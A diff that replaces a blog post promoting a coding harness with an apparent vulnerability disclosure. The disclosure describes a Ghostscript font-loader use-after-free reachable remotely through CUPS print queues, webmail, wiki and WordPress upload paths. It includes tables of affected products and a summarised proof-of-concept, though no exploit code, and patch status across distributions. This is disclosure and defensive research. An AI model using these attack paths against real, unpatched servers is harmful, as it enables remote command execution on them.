-If you’ve been holding off on local models then I do recommend you reconsider. Small ones like Qwen 3.8 27B (or its cousin, Flash Next) can run well on a high-end gaming rig or Mac, or with a little investment if you do not have that. If you have a dinky old computer and you’re cash starved, then not *all* hope is lost. Turn to the potato agronomists on twitter: give twitter’s AI, Grok, what you have and what you can reasonably spend and tell it to track down the cutting edge setup for your rig. This is no lie the fastest, easiest way to catch up to the cutting edge of self-hosted inference today. Five minutes.
+### Debian 13
 
-### Coding harnesses are the IDEs of the future
+We also reached Ghostscript through CUPS on Debian 13 and other Linux distributions. On Debian 13, we sent an IPP `Print-Job` to a shared network queue that accepted jobs without authentication. CUPS passed our PostScript document to `gstopdf`, which started the distribution's Ghostscript with `-dSAFER`. The command ran on the print server as `uid=7(lp)`.
 
-As I’ve been building DreamCoder, I have come to the belief I’m not just building a coding harness. Coding harnesses are an IDE for the future; it will do more than just display a chat window for coding agent work. DreamCoder does more than that already. It’s going the way of Emacs in that it’ll consume a wide range of adjacent workflows and tools. But I have only just gotten started. I am brimming with ideas I’m building in parallel, but they take time because as I said it’s not about the code; it’s just one small facet of building something that works well. But you know that already: it’s always the last mile.
+```
+anonymous IPP Print-Job
+  → shared CUPS queue
+  → gstopdf → Ghostscript (-dSAFER)
+  → font-loader use-after-free
+  → native path control changed
+  → command executed on the host as uid=7(lp)
+```
 
-DreamCoder is the most ambitious, technically complex and advanced software project I have ever built in my life. And that’s just the beginning. I’m not done. I’ve barely started. I will be blogging about this going forward, in addition to my usual Emacs scribblings.
+Our RCE proof executed one fixed command and wrote a marker under `/var/tmp`. Requiring authentication on the queue blocked the unauthenticated submission. Shared queues that accept network print jobs without credentials expose the renderer to anyone who can reach them.
 
-In fact, the thing I’m currently grinding away at is a world-class pentest and cybersecurity suite in DreamCoder. Every single bit of software we have ever written is vulnerable; we have many rough years ahead of us. Just look at the crippling vulnerabilities coming out every day now almost. Even the most security conscious person is going to find themselves on the wrong side for no other reason than we depend on packages that were mature and stable and assumed to be secure. DreamCoder can do its bit to help catch many of most obvious weaknesses, especially as new software is minted every day that also needs thorough testing.
+The [Ghostscript CVE](https://www.cve.org/CVERecord?id=CVE-2026-125396) scores the interpreter flaw at **8.5 under CVSS 4.0**. That rating uses a local attack vector. Our demonstrations reached the interpreter remotely, through both production services and the applications described here. CUPS supplied a network-exploitable print path; Roundcube supplied an email-based remote exploit; WordPress and its plugins supplied remotely exploitable upload paths. The recorded trials show that these chains were repeatable. The attacker could deliver the exploit remotely, despite the interpreter's local attack-vector classification.
 
-To round it off, I would like to formally invite you to join me in making DreamCoder better by [trying it out](https://www.dreamcoder.ai). It’s great. It’s not a toy; it’s not a demo; and it’s not a weekend prototype. It’s a frontier coding harness that has most of what you’d expect: MCP, backgroundable sub agents and shell commands, terminal windows, skills, hooks, 99% cache hit, it runs for days, and an interactive UI for all of it. There’s a handy dandy importer for your Pi, OpenCode or Codex configs also to help you get started. A couple of clicks and your model settings are set up in DreamCoder. Ready to go.
+## Application paths
 
-Please do e-mail me your thoughts (`(rot13 "zvpxrl@znfgrevatrznpf.bet")`) on AI, coding harnesses, what you’ve built with it, and what you think more generally about where our world is heading. I’m keen to hear from you.
+The first ten rows show Upload2Shell proofs in products or their shipped components. The rows after them trace more upload and preview paths. Each entry gives the access, tested stack or pinned source revision, and the processing step that matters.
 
-And if you want to hear more from me on the technical aspects of AI, building coding harnesses, and more, then do sign up for the [DreamCoder newsletter](https://www.masteringemacs.org/article/announcing-dreamcoder#newsletter) below.
+| Product and tested stack / source revision | Attacker access and trigger | Result or renderer path | Evidence | Case study / PoC |
+| --- | --- | --- | --- | --- |
+| **Debian 13 CUPS**, Ghostscript `10.05.1~dfsg-1+deb13u1` | Anonymous IPP `Print-Job` to a shared network queue | Command on the host as `uid=7(lp)` | One complete remote run; 20/20 separate local conversions | First in series |
+| **Roundcube 1.7.2**, Ghostscript 10.07.1 | External sender emails a disguised attachment; authenticated recipient views the message, without clicking the attachment; permissive ImageMagick delegate required | Command as `uid=33(www-data)` | 5/5 message-view trials | Not yet published |
+| **WordPress 7.0.2 + Forminator 1.55.1**, Ghostscript 10.05.1 | Signed-out visitor submits a public PDF upload form configured to store files in the Media Library | Command as `uid=33(www-data)` | 5/5 HTTP trials | Not yet published |
+| **WordPress 7.0.2 + Essential Addons for Elementor Lite 6.7.0 + Elementor 4.2.0**, Ghostscript 10.05.1 | Signed-out visitor uses a public Login/Register widget with a custom upload field and registration enabled | Command as `uid=33(www-data)` | 5/5 HTTP trials | Not yet published |
+| **WordPress Core** 7.0.0–7.0.3, 6.9.0–6.9.6, and earlier branches listed in the advisory; local renderer test on 6.9.4 | Author+ user with `upload_files` submits a malicious file on a site using Imagick and Ghostscript | [WordPress confirms remote code execution](https://wordpress.org/news/2026/08/wordpress-7-0-4-release/); our exact renderer test ran a command and wrote a PHP file as `uid=33(www-data)` | [CVE-2026-65640](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-8vr3-7mxf-gx8w); fixed in 7.0.4, 6.9.7 and backports; 10/10 local renderer trials | Not yet published |
+| **MediaWiki 1.46.0 + PdfHandler**, Ghostscript 10.05.1 | Anonymous PDF upload and thumbnail request on a wiki explicitly configured to permit anonymous uploads | Command as `uid=33(www-data)` | 5/5 HTTP trials | Not yet published |
+| **DokuWiki 2026-07-14a**, Ghostscript 10.05.1 | Anonymous upload and resize on an open wiki using the optional ImageMagick backend and a permissive policy | Command as `uid=33(www-data)` | 5/5 HTTP trials | Not yet published |
+| **Mayan EDMS 4.11.5**, Ghostscript 10.05.1 | External sender emails a configured POP3 document source; worker imports and renders automatically | Command as `uid=1000` inside the application container | One email-to-worker run; parser path 5/5 | Not yet published |
+| **ResourceSpace 11.0 r29423**, Ghostscript 10.05.1 | Authenticated user or valid upload-share capability submits a resource | Command in the preview worker | 5/5 complete API trials | Not yet published |
+| **Plesk Obsidian 18.0.79**, Plesk Roundcube 1.6.17 and Ghostscript 9.54.0 | Roundcube message thumbnail; our test invoked its `rcube_image::resize()` component directly | Exact Plesk components ran a command as `uid=995(roundcube_sysuser)` in 5/5 tests in the successful configuration. | — | Not yet published |
+| More application paths · renderer test or pinned source |  |  |  |  |
+| **Gradio 6.32.0**, Pillow 13.0.0; Ubuntu 24.04 with Ghostscript installed | Image submission to an unauthenticated `gr.Image` app | HTTP preprocessing sent EPS bytes named `.png` through Pillow to `gs -dSAFER` | Renderer observed before the app function ran | — |
+| **InvokeAI**, [source revision 5921fd6e](https://github.com/invoke-ai/InvokeAI/blob/5921fd6e84c6e08987ddd762c7ca764058741acf/invokeai/app/api/routers/images.py#L55-L145) | Single-user image upload; no login on a reachable service | Upload calls Pillow `Image.open()` and `load()` | Upload and authentication paths in pinned source | — |
+| **AUTOMATIC1111 Stable Diffusion WebUI**, [source revision 82a973c0; Gradio 3.41.2; Pillow 9.5.0](https://github.com/AUTOMATIC1111/stable-diffusion-webui/blob/82a973c04367123ae98bd9abdf80d9eda9b910e2/requirements_versions.txt#L1-L11) | Shared img2img upload; login only if configured | [Image input](https://github.com/AUTOMATIC1111/stable-diffusion-webui/blob/82a973c04367123ae98bd9abdf80d9eda9b910e2/modules/ui.py#L541-L553) enters Gradio preprocessing and Pillow pixel conversion | Image input and preprocessing in pinned source | — |
+| **ComfyUI**, [source revision 0263e488](https://github.com/Comfy-Org/ComfyUI/blob/0263e48806e5be43fa926d3961caac29cd268d84/server.py#L469-L667) | Image upload and preview on a reachable service | [Preview route](https://github.com/Comfy-Org/ComfyUI/blob/0263e48806e5be43fa926d3961caac29cd268d84/server.py#L599-L667) opens and converts the uploaded file with Pillow | Upload and preview routes in pinned source | — |
+| **Frappe / ERPNext**, [Frappe source revision 2bf593fd](https://github.com/frappe/frappe/blob/2bf593fd229e025879ae661fa5fb67d569ee9130/frappe/handler.py#L207-L229) | Image upload with an account, or as a guest when enabled; optimization requested | Upload handler selects the image type from the filename and calls [Pillow thumbnail processing](https://github.com/frappe/frappe/blob/2bf593fd229e025879ae661fa5fb67d569ee9130/frappe/utils/image.py#L52-L78) | Upload handler and optimization code in pinned source | — |
+| **Home Assistant Core**, [source revision e87199c7](https://github.com/home-assistant/core/blob/e87199c78fadc70ede16dcd278e6c086f9d8bc31/homeassistant/components/image_upload/__init__.py#L76-L124) | Account image upload; public thumbnail endpoint | [Thumbnail route](https://github.com/home-assistant/core/blob/e87199c78fadc70ede16dcd278e6c086f9d8bc31/homeassistant/components/image_upload/__init__.py#L193-L261) loads and resizes the stored image through Pillow | Upload and thumbnail routes in pinned source | — |
+| **CVAT**, [source revision b976874b](https://github.com/cvat-ai/cvat/blob/b976874b367cd1b35cfa4c7da0dea293a4d28523/cvat/apps/engine/media_extractors.py#L124-L128) | Task-data upload with an account | Frame worker calls Pillow `Image.open().load()` after image classification | Task route and frame worker in pinned source | — |
+| **Paperless-ngx**, [source revision bcfdfcaa; official image includes Ghostscript](https://github.com/paperless-ngx/paperless-ngx/blob/bcfdfcaa29e7f4d98df5eb9a2ad01cbb8f0bd6a7/Dockerfile#L119-L132) | Email attachment through a configured inbox | [PDF/A conversion](https://github.com/paperless-ngx/paperless-ngx/blob/bcfdfcaa29e7f4d98df5eb9a2ad01cbb8f0bd6a7/src/paperless/parsers/tesseract.py#L454-L493) calls Ghostscript directly | Mail importer and converter in pinned source | — |
+| **django-filer**, [source revision 42ab4a73](https://github.com/django-cms/django-filer/blob/42ab4a73a0422fba101a50a8deb1807cf8305f17/filer/models/abstract.py#L113-L137) | Authenticated django-filer image upload | Image model opens the file with Pillow | Pillow identification path in pinned source | — |
+
+### Production services
+
+Our Ghostscript research also reached Google, Dropbox, and other production services whose names are redacted. The table brings those production services together; the Dropbox and redacted findings have separate roots from the Type 1 bug described in this article.
+
+| Product and renderer | Entry and access shown | What the proof established | Case study / PoC |
+| --- | --- | --- | --- |
+| **Google's image and document pipeline**, Ghostscript 10.05.0 | **Google Docs:** signed-out request pointing to an attacker-hosted PostScript file labeled as an image or PDF. **Google Chat, Google Drive, and Gmail:** PostScript uploads | The proof of concept we sent them read and returned the worker's `/proc/version` file. | Not yet published |
+| **Dropbox** | Production file-processing workflow | Separate Ghostscript finding; maximum program bounty awarded. Technical details will follow in the case study. | Not yet published |
+| **Redacted** | Production file-processing workflow | Separate Ghostscript finding; maximum program bounty awarded. Technical details will follow in the case study. | Not yet published |
+| **Redacted** | Production file-processing workflow | Separate Ghostscript finding; maximum program bounty awarded. Technical details will follow in the case study. | Not yet published |
+| **Redacted** | Production file-processing workflow | Separate Ghostscript finding; maximum program bounty awarded. Technical details will follow in the case study. | Not yet published |
+| **Redacted** | Production file-processing workflow | Separate Ghostscript finding; maximum program bounty awarded. Technical details will follow in the case study. | Not yet published |
+| **Redacted** | Production file-processing workflow | Separate Ghostscript finding; maximum program bounty awarded. Technical details will follow in the case study. | Not yet published |
+
+The renderer's account and the surrounding system controls determine what follows native memory control. That is why the table records process privileges and the observed result alongside the application name.
+
+## Proof of Concept
+
+Here is a complete, self-contained PostScript proof of the native operator write described above. It writes its Type 1 font to Ghostscript's process-local `%ram%` device, triggers the font-loader flaw, reuses the freed allocation, changes a live `mul` reference to call `sub`, and restores the original bytes. No companion font file is needed.
+
+```
+gs -dSAFER poc-native-write.pdf
+```
+
+```
+BEFORE=319
+HIJACKED=18
+RESTORED=319
+```
+
+Each step below points to its lines in the full file. The `29 × 11` check returns `319` before and after the write. While the pointer is changed, it returns `18`, the result of subtraction. This proof demonstrates native memory control; the command-execution chain described above changes Ghostscript's path-control state instead.
+
+The file changes native memory inside the rendering process. It does not execute a shell command or touch host files. On the fixed 10.08.0 build, the dangling-reference lookup failed before the pointer write.
+
+## Fixing the interpreter and its callers
+
+[Artifex's first fix](https://github.com/ArtifexSoftware/ghostpdl/commit/1484854e0c8ddfda1baa4ad4cd965b8a9790aa81) checks the operands before `.putgstringcopy` can fail in `copy`. That closes the error path we used to recover the privileged store. A [subsequent change](https://github.com/ArtifexSoftware/ghostpdl/commit/e0421767e13627e75055bb44cb01486887c2f9e8) moves the helper into C and removes its dependence on `.forceput`.
+
+The first patch also explains why this kind of operation has been difficult to remove. Artifex was already working to eliminate or minimize its use. As the maintainer put it:
+
+> “it isn't easy to undo 30 years worth of assumptions in the code.”
+>
+> Ken Sharp, Artifex, in the fix for bug 709684
+
+An internal font loader needed a write that ordinary document code could not perform. An error exposed that authority to the document, and the document used it to violate an object-lifetime rule. The final memory corruption depended on assumptions made at several different layers.
+
+The applications had their own opportunities to interrupt the chain. WordPress [released its Core mitigation in 7.0.4](https://wordpress.org/news/2026/08/wordpress-7-0-4-release/) on 12 August, with [backports to older supported branches](https://wordpress.org/documentation/wordpress-version/version-7-0-4/). Its application CVE and the Ghostscript CVE address different points in the processing path. For the CUPS route, queue authentication controls who can submit the document. A policy that prevents a renderer from starting a shell can limit what happens even after the interpreter is compromised.
+
+The fix has to reach the renderer the application actually uses. Updating the host operating system does not update a separate copy of Ghostscript inside an existing container image or application bundle. A document worker can therefore keep using vulnerable code after the host's package has been replaced.
+
+Application hardening can close a route into the interpreter as well. The Roundcube sequence illustrates why the order of operations matters: checking a file's real type after generating its thumbnail gives the renderer the first chance to interpret it. For each downstream service, the useful question is what changed in the path from the submitted file to the rendering process.
+
+## Where the fix has reached
+
+Artifex released the root fix in [Ghostscript 10.08.0 on 8 September 2026](https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/tag/gs10080). Many distributions have since shipped it, either in that release or as a backport to an older version. Ubuntu published fixes for seven releases; Debian patched Trixie and its development branches.
+
+The coverage is uneven. As of 12 November, Debian still listed Bookworm as vulnerable, Amazon Linux listed a pending fix, and several SUSE branches remained affected or in progress. Applications on those branches can still expose the flaw when their file-processing path reaches the affected Ghostscript package. A distribution name or a recent update to another Ghostscript CVE is not enough to establish that this bug is fixed.
+
+The tables below record the package status for this specific flaw. Older version numbers can include a backported fix; a published fixed version does not establish that every application or container has adopted it.
+
+### Vendor trackers still open
+
+As of 12 November 2026, the following vendor trackers still listed a vulnerable, affected, or pending Ghostscript package for this exact flaw. These labels describe package status, not a tested remote application path. Check the package actually installed or bundled by each service.
+
+| Platform | Vendor status | Evidence |
+| --- | --- | --- |
+| Debian 12 (Bookworm) | Vulnerable | [`10.0.0~dfsg-11+deb12u8` in Debian's vulnerable column](https://security-tracker.debian.org/tracker/CVE-2026-125396) |
+| Amazon Linux 2, 2023, and 2027 Preview | Pending Fix | [Amazon's CVE status for `ghostscript`](https://explore.alas.aws.amazon.com/CVE-2026-125396.html) |
+| SUSE Linux Enterprise 12 SP5 LTSS and selected 15 SP4–SP7 lines | In progress | [SUSE lists proposed packages in QA](https://www.suse.com/security/cve/CVE-2026-125396.html) |
+| SUSE Linux Enterprise Server 16.0 and 16.1 | In progress | [SUSE product status](https://www.suse.com/security/cve/CVE-2026-125396.html) |
+| openSUSE Leap 16.0 and 16.1 | Affected | [SUSE product status](https://www.suse.com/security/cve/CVE-2026-125396.html) |
+
+We did not establish whether current RHEL, Rocky Linux, AlmaLinux, Oracle Linux, or stable Fedora packages contain the `.putgstringcopy` fix.
+
+### Distribution packages
+
+Ubuntu's [USN-8949-1](https://ubuntu.com/security/notices/USN-8949-1), published on 21 October 2026, describes our font-operand finding and lists fixed Ghostscript packages for seven releases. The notice predates the CVE assignment, so it labels this finding “No CVE number.” These are package fixes, not additional remote application tests.
+
+#### Ubuntu fixed versions
+
+| Ubuntu release | Fixed package version in USN-8949-1 | Notice date |
+| --- | --- | --- |
+| 26.10 | `10.07.1~dfsg-1ubuntu2.1` | 21 Oct 2026 |
+| 26.04 LTS | `10.06.0~dfsg-3ubuntu1.2` | 21 Oct 2026 |
+| 24.04 LTS | `10.02.1~dfsg1-0ubuntu7.10` | 21 Oct 2026 |
+| 22.04 LTS | `9.55.0~dfsg1-0ubuntu5.15` | 21 Oct 2026 |
+| 20.04 LTS (Pro) | `9.50~dfsg-5ubuntu4.15+esm3` | 21 Oct 2026 |
+| 18.04 LTS (Pro) | `9.26~dfsg+0-0ubuntu0.18.04.18+esm6` | 21 Oct 2026 |
+| 16.04 LTS (Pro + Legacy) | `9.26~dfsg+0-0ubuntu0.16.04.14+esm11` | 21 Oct 2026 |
+
+#### Debian stable and development branches
+
+[Debian's tracker](https://security-tracker.debian.org/tracker/CVE-2026-125396) records the first fixed source version for Trixie and unstable. The testing branch later received the upstream-fixed package. Debian 12 remains listed vulnerable in the vendor-status table above.
+
+| Debian release | Fixed Ghostscript package | Documented date |
+| --- | --- | --- |
+| Debian 13 (Trixie) | `10.05.1~dfsg-1+deb13u2`; current security build `+deb13u3` | [25 Sep 2026 advisory](https://security-tracker.debian.org/tracker/DSA-6516-1) |
+| Debian 14 (Forky/testing) | `10.08.0~dfsg-2` | [28 Sep 2026 migration](https://tracker.debian.org/pkg/ghostscript/news/?page=1) |
+| Debian unstable (Sid) | `10.08.0~dfsg-1` first fixed; later `-2` | [12 Sep 2026 upload](https://tracker.debian.org/pkg/ghostscript/news/?page=1) |
+
+#### Other Linux distributions and BSDs
+
+The records below show packages containing upstream Ghostscript 10.08.0 or an advisory-listed fixed build. A package appearing here does not establish the first fixed date for every architecture or branch.
+
+| Distribution | Package with the fix | Documented date |
+| --- | --- | --- |
+| [Arch Linux](https://archlinux.org/packages/extra/x86_64/ghostscript/) | `10.08.0-1` | 11 Sep 2026 repository update |
+| [Fedora Rawhide (46)](https://packages.fedoraproject.org/pkgs/ghostscript/ghostscript/fedora-rawhide.html) | `10.08.0-1.fc46` | 15 Sep 2026 changelog |
+| [Gentoo](https://packages.gentoo.org/packages/app-text/ghostscript-gpl/changelog) | `10.08.0` | 27 Sep added; 28 Sep stabilized |
+| [Alpine Edge](https://pkgs.alpinelinux.org/package/edge/community/x86_64/ghostscript) | `10.08.0-r0` | 14 Oct 2026 build |
+| [Alpine 3.24](https://pkgs.alpinelinux.org/package/v3.24/community/riscv64/ghostscript) | `10.08.0-r0` | 15 Oct 2026 build |
+| [Alpine 3.23](https://pkgs.alpinelinux.org/package/v3.23/main/x86_64/ghostscript) | `10.08.0-r0` | 19 Oct 2026 build |
+| [openSUSE Tumbleweed](https://ftp.suse.com/pub/projects/security/osv/openSUSE-SU-2026:12528-1.json) | `10.08.0-5.1` (advisory-listed) | 11 Nov 2026 advisory; earlier 10.08.0 packages existed |
+| [FreeBSD Ports](https://cgit.freebsd.org/ports/commit/?id=9f90661c19e6a96af1a9f8a9dc85c70f8d4dd4fc) | `ghostscript10 10.08.0` | 12 Sep 2026 ports update |
+| [NetBSD pkgsrc](https://mail-index.netbsd.org/pkgsrc-changes/2026/09/13/msg354558.html) | `ghostscript-agpl 10.08.0` | 13 Sep 2026 commit |
+| [Nixpkgs / NixOS 26.05](https://github.com/NixOS/nixpkgs/pull/566751) | `10.08.0` | Available by 12 Nov; first channel date unestablished |
+| [Kali rolling](https://pkg.kali.org/pkg/ghostscript/news/) | `10.08.0~dfsg-2` | 12 Oct 2026 import |
+| [Mageia 10](https://advisories.mageia.org/MGASA-2026-0545.html) | `10.08.0-1.mga10` | 26 Oct 2026 advisory for another Ghostscript CVE; upstream version includes this fix |
+
+### Other channels carrying the fix
+
+Fixed Ghostscript builds also reached Windows and macOS packaging channels. The availability of a package does not tell us which Ghostscript binary a particular application uses.
+
+| Channel | Version | Documented availability |
+| --- | --- | --- |
+| [Artifex Windows installers](https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/tag/gs10080) | `gs10080w32.exe` and `gs10080w64.exe` | 8 Sep 2026 upstream release |
+| [conda-forge](https://anaconda.org/conda-forge/ghostscript/files?channel=main&type=conda) | `10.08.0` for Windows, macOS, and Linux | 8 Sep 2026 files |
+| [Chocolatey](https://community.chocolatey.org/packages/Ghostscript/10.8.0) | `10.8.0` for Windows | 8 Sep 2026 package |
+| [Cygwin](https://cygwin.com/pub/cygwin/x86_64/release/ghostscript/) | `10.08.0-1` for Windows | 19 Sep 2026 package archive |
+| [MSYS2 / MinGW](https://packages.msys2.org/packages/mingw-w64-ucrt-x86_64-ghostscript) | `10.08.0-2` | 30 Sep 2026 build |
+| [Homebrew](https://formulae.brew.sh/formula/ghostscript) | `10.08.0` | Available by 12 Nov; first date unestablished |
+| [MacPorts](https://ports.macports.org/port/ghostscript/details/) | `10.08.0` | Available by 12 Nov; first date unestablished |
+
+## The rest of the dependency tree
+
+The dependency problem is easy to miss from the top of an application. Several layers below, a file may enter PostScript or another interpreter that never appeared in the application's security review. A review that checks only whether the upload handler accepts trusted file types can miss a vulnerability in the code that eventually processes them. A penetration test that stops at the same boundary has the same blind spot.
+
+Alongside this Type 1 issue, our broader Ghostscript audit reached production services at Dropbox and other redacted vendors through separate findings. Each program paid its maximum bounty. Their case studies will explain the individual root causes and proofs once we have permission to publish the technical details. The series is organized around the underlying bugs as well as the products.
+
+WordPress released its mitigation on 12 August. Artifex authored the Ghostscript fix on 2 September, committed it on 7 September, and released 10.08.0 on 8 September. We completed the Debian network CUPS proof on 17 September. The Ghostscript CVE was published on 9 November in US Eastern time.
+
+**The Debian 13 CUPS chain will be the first full case study and PoC in this series.** The other product writeups will follow, with the build, delivery path, exploit result, and vendor response for each. We will add their links to the tables as they appear.
+
+We expect other researchers to find more applications affected by this flaw. The useful place to look is the processing that follows an accepted file: thumbnail generation, metadata extraction, document import, and print conversion. Each can hand an attacker-controlled document to a process with access the sender does not have. Upload2Shell let the document use that access for itself.
